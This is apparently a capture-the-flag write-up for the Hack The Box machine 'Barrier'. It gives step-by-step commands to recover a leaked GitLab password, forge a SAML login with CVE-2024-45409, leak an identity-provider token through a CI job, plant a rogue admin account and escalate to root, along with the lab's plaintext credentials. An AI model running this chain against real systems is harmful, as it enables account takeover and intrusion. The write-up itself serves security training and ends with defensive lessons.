# Barrier — Writeup
> Hack The Box | Medium | 2026-03-27

## Summary

Barrier is a medium-difficulty Linux box centered on a SAML-integrated DevOps stack: GitLab CE, authentik (identity provider), and Apache Guacamole (remote access gateway). The attack chain begins with a credential leak in GitLab commit history, escalates through a critical SAML signature verification bypass (CVE-2024-45409) to gain GitLab admin, pivots through a CI/CD environment variable leak to compromise the identity provider, and ultimately reaches the host via SSH credentials stored in Guacamole's database.

## Reconnaissance

A full TCP port scan revealed six services:

```bash
nmap -p- -sC -sV -T4 10.129.234.46
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 |
| 80 | HTTP | nginx (redirects to :443) |
| 443 | HTTPS | GitLab CE 17.3.2 |
| 8080 | HTTP | Apache Tomcat 9.0.58 |
| 9000 | HTTP | authentik 2024.10.5 |
| 9443 | HTTPS | authentik 2024.10.5 (SSL) |

Key observations from the scan:
- The SSL certificate on port 443 disclosed the hostname `gitlab.barrier.vl`
- Port 80 redirected to `https://gitlab.barrier.vl:443/`
- Port 9000 identified itself as authentik via the `X-Powered-By: authentik` header, with version `2024.10.5` visible in JavaScript asset filenames
- The authentik `/api/v3/root/config/` endpoint was accessible unauthenticated, revealing capabilities including `can_impersonate` and `is_enterprise`

After adding `gitlab.barrier.vl` and `barrier.vl` to `/etc/hosts`, the GitLab sign-in page confirmed SAML authentication was configured — a "SAML login" button was present alongside standard login. The GitLab metadata endpoint at `/users/auth/saml/metadata` confirmed the SAML Service Provider configuration with ACS URL at `/users/auth/saml/callback`.

The GitLab version was confirmed as **17.3.2** via the authenticated API endpoint `/api/v4/metadata`. This version is one patch behind 17.3.3, which is significant — 17.3.3 patched CVE-2024-45409.

## Enumeration

### GitLab Credential Recovery

The GitLab API revealed a public project at `/api/v4/projects`:

```json
{"path_with_namespace": "satoru/gitconnect", "visibility": "public"}
```

The repository contained a single file, `gitconnect.py` — a Python script that authenticates to GitLab via OAuth. The current version had the password redacted:

```python
auth_data = {
    'grant_type': 'password',
    'username': 'satoru',
    'password': '***'
}
```

But the commit history told a different story. The initial commit (`a8e43e54`) contained the plaintext password:

```bash
curl -sk 'https://gitlab.barrier.vl/api/v4/projects/1/repository/files/gitconnect.py/raw?ref=a8e43e54'
```

```python
'password': 'dGJ2V72SUEMsM3Ca'
```

Verified immediately via OAuth:

```bash
curl -sk -X POST 'https://gitlab.barrier.vl/oauth/token' \
  -d 'grant_type=password&username=satoru&password=dGJ2V72SUEMsM3Ca'
# Returns access_token — confirmed valid
```

### SAML Identity Confirmation

Using satoru's OAuth token to query the user profile revealed a critical detail:

```json
"identities": [{"provider": "saml", "extern_uid": "satoru"}]
```

satoru had a linked SAML identity through authentik. This meant:
1. SAML authentication was actively configured between authentik and GitLab
2. A legitimate SAML flow could be completed using satoru's credentials
3. The signed SAMLResponse from that flow would be the raw material for CVE-2024-45409

### GitLab User Enumeration

With authenticated access, user enumeration revealed the admin account:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" 'https://gitlab.barrier.vl/api/v4/users?per_page=100'
```

| ID | Username | Role |
|----|----------|------|
| 1 | akadmin | Admin |
| 2 | satoru | User |

The admin was `akadmin` — not the GitLab default `root`. This username matches authentik's default admin, suggesting the same person set up both services.

### CI/CD Runner Discovery

```bash
curl -sk -H "Authorization: Bearer $TOKEN" 'https://gitlab.barrier.vl/api/v4/projects/1/runners'
```

A shared instance runner existed (ID 1) but was **paused**. Only an admin could unpause it. This established the exploitation objective: GitLab admin access would unlock CI/CD code execution.

## Foothold — CVE-2024-45409: SAML Signature Verification Bypass

### The Vulnerability

CVE-2024-45409 (CVSS 9.8) affects ruby-saml versions up to 1.16.0, used by GitLab CE/EE before 17.3.3.

The vulnerability is in how ruby-saml verifies XML digital signatures on SAML assertions. During signature verification, the library needs to locate the `<ds:DigestValue>` element to compare against the computed digest of the signed assertion. It uses an XPath query to find this element — but XPath's selection returns the **first matching element in document order**, not necessarily the one inside the legitimate `<ds:Reference>`.

This means an attacker can:
1. Take a legitimately signed SAML response from the IdP
2. Inject a forged `<ds:DigestValue>` element **earlier** in the XML document (e.g., inside `<samlp:StatusDetail>`)
3. Modify the assertion content — change the NameID to any target user
4. Compute the correct digest for the modified assertion and place it in the injected element
5. ruby-saml's XPath query finds the injected digest first, validates it against the tampered assertion, and declares the signature valid

The original signature remains untouched in the document. The library simply checks the wrong digest.

### Step 1 — Capture a Legitimate SAMLResponse

To get a signed SAML document from authentik, I authenticated as satoru through the full SAML flow:

1. Navigated to GitLab's sign-in page
2. Clicked the SAML login button (POST to `/users/auth/saml`)
3. Was redirected to authentik's authentication flow
4. Authenticated as `satoru` / `dGJ2V72SUEMsM3Ca`
5. Approved the consent prompt

authentik uses HTTP-Redirect binding, so the SAMLResponse appeared as a deflate-compressed, base64-encoded query parameter in the redirect URL back to GitLab. I captured this in Burp Suite and decoded it using Burp's Decoder (URL decode -> Base64 decode -> Inflate) to obtain the raw XML.

The SAMLResponse contained a signed assertion with `NameID=satoru`, the authentik signing certificate, and valid digest/signature values.

### Step 2 — Forge the Assertion

Using the [synacktiv CVE-2024-45409 PoC](https://github.com/synacktiv/CVE-2024-45409):

```bash
git clone https://github.com/synacktiv/CVE-2024-45409.git
python3 CVE-2024-45409.py -r saml_response.xml -o saml_forged.xml -n akadmin
```

The PoC:
- Removes the signature from the response level and moves it into the assertion
- Changes the assertion's NameID from `satoru` to `akadmin`
- Updates the NotOnOrAfter timestamps to prevent expiry
- Computes a new digest for the modified assertion
- Injects the new digest inside a `<samlp:StatusDetail>` element before the assertion
- The original signature's `<ds:Reference>` still points at the assertion ID, but ruby-saml will find the injected digest first

### Step 3 — Submit to GitLab

```bash
# Get a fresh GitLab session with SAML state
CSRF=$(curl -sk -c /tmp/cookies 'https://gitlab.barrier.vl/users/sign_in' | \
  grep -oP 'csrf-token"\s+content="\K[^"]+')
curl -sk -b /tmp/cookies -c /tmp/cookies -X POST \
  'https://gitlab.barrier.vl/users/auth/saml' \
  --data-urlencode "authenticity_token=$CSRF" -o/dev/null

GL_SESSION=$(grep _gitlab_session /tmp/cookies | awk '{print $NF}')

# Submit the forged SAML response
SAML_B64=$(base64 -w0 saml_forged.xml)
curl -sk -b "_gitlab_session=$GL_SESSION" \
  -X POST 'https://gitlab.barrier.vl/users/auth/saml/callback' \
  --data-urlencode "SAMLResponse=$SAML_B64" \
  -D- -o/dev/null
```

Response:

```
HTTP/2 302
location: https://gitlab.barrier.vl/
set-cookie: _gitlab_session=1e86d0274f470e15a3067710c1682d75; ...
set-cookie: known_sign_in=...; ...
```

Verification:

```bash
curl -sk -b '_gitlab_session=1e86d0274f470e15a3067710c1682d75' \
  'https://gitlab.barrier.vl/api/v4/user'
```

```json
{"username": "akadmin", "id": 1, "is_admin": true, "email": "admin@barrier.vl"}
```

GitLab admin achieved.

## Privilege Escalation: User

### CI/CD Environment Variable Leak

As GitLab admin, I unpaused the shared CI/CD runner:

```bash
curl -sk -b "_gitlab_session=$SESSION" -X PUT \
  'https://gitlab.barrier.vl/api/v4/runners/1' \
  -H 'Content-Type: application/json' \
  -H "X-CSRF-Token: $CSRF" \
  -d '{"paused":false}'
```

The runner was a Docker executor with no internet access (DNS timeout to Docker Hub). After several failed image pulls, I used the locally cached `gitlab/gitlab-ce:17.3.2-ce.0` image — the same image running GitLab itself.

Created a project and committed a minimal `.gitlab-ci.yml`:

```yaml
stages:
  - build

recon:
  stage: build
  tags:
    - auto_5e7f
  image: gitlab/gitlab-ce:17.3.2-ce.0
  script:
    - id
    - env | sort
```

The pipeline output revealed:

```
AUTHENTIK_TOKEN=MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc
```

### authentik Superadmin Access

The leaked token was an authentik API key with superadmin privileges:

```bash
curl -s 'http://10.129.234.46:9000/api/v3/core/users/me/' \
  -H "Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc"
```

```json
{"username": "akadmin", "is_superuser": true}
```

### Guacamole Discovery

Enumerating authentik's application registry revealed a second SAML-integrated application:

```bash
curl -s 'http://10.129.234.46:9000/api/v3/core/applications/' \
  -H "Authorization: Bearer $AK_TOKEN"
```

| Application | SAML ACS URL |
|-------------|--------------|
| Gitlab | `https://gitlab.barrier.vl/users/auth/saml/callback` |
| Guacamole | `http://barrier.vl:8080/guacamole/api/ext/saml/callback` |

Port 8080 — which we'd identified as "Apache Tomcat" — was actually hosting **Apache Guacamole**, a remote desktop/SSH gateway. The Tomcat default page had hidden the deployed application at `/guacamole/`.

### Guacamole to SSH

Created an authentik admin account to access Guacamole:

```bash
# Create user
curl -s -X POST 'http://10.129.234.46:9000/api/v3/core/users/' \
  -H "Authorization: Bearer $AK_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"username":"operator","name":"operator","is_active":true,"email":"operator@barrier.vl"}'

# Add to admin group
curl -s -X POST 'http://10.129.234.46:9000/api/v3/core/groups/<admin-group-uuid>/add_user/' \
  -H "Authorization: Bearer $AK_TOKEN" \
  -d '{"pk": 36}'

# Set password
curl -s -X POST 'http://10.129.234.46:9000/api/v3/core/users/36/set_password/' \
  -H "Authorization: Bearer $AK_TOKEN" \
  -d '{"password":"Operator123!"}'
```

Logged into Guacamole via SAML at `http://barrier.vl:8080/guacamole/`. Guacamole's MySQL database (`guac_user:guac2024` from `guacamole.properties`) stored SSH connection parameters in plaintext:

| Parameter | Value |
|-----------|-------|
| username | `maki_adm` |
| port | `22` |
| passphrase | `3V32FN6oViMPxyzC` |
| private-key | RSA key (AES-128-CBC encrypted) |

```bash
ssh -i maki_adm.key -o HostKeyAlgorithms=+ssh-rsa maki_adm@10.129.234.46
# Passphrase: 3V32FN6oViMPxyzC
```

```
uid=1002(maki_adm) gid=1002(admin) groups=1002(admin)
```

User shell on the host.

## Privilege Escalation: Root

The `.bash_history` file in maki_adm's home directory contained:

```
sudo su
Va4kSjgTHSd55ZLv
```

The user had typed their sudo password as a command — they likely hit Enter before the password prompt appeared. This is a common mistake with slow SSH sessions.

```bash
echo "Va4kSjgTHSd55ZLv" | sudo -S id
# uid=0(root) gid=0(root) groups=0(root)
```

Root.

## Flags

```
user.txt: [REDACTED]
root.txt: [REDACTED]
```

## Key Takeaways

1. **Git history is permanent.** Redacting a credential in a subsequent commit does nothing — the original commit is still accessible via the API. Force-push with history rewrite or rotate the credential immediately.

2. **SAML signature verification is subtle and dangerous.** CVE-2024-45409 isn't about a missing check — the signature IS verified. The bug is that XPath selects the wrong element. Defenders should upgrade ruby-saml and monitor SAML callback logs for assertions with mismatched NameIDs or unusual XML structures.

3. **CI/CD environment variables are a lateral movement goldmine.** The AUTHENTIK_TOKEN had no business being in a runner's environment. Secrets injected into CI/CD pipelines are accessible to anyone who can trigger a build — which on a shared runner means any project on the instance.

4. **Tomcat default pages hide deployed applications.** Port 8080 showed the Tomcat welcome page, but Guacamole was running at `/guacamole/`. A single directory enumeration would have found it during recon instead of discovering it indirectly through authentik's application registry.

5. **Remote access gateways store credentials.** Guacamole, similar to tools like RoyalTS or mRemoteNG, stores connection credentials in its database. Compromising the gateway's backend gives you every credential it manages — often including privileged service accounts.
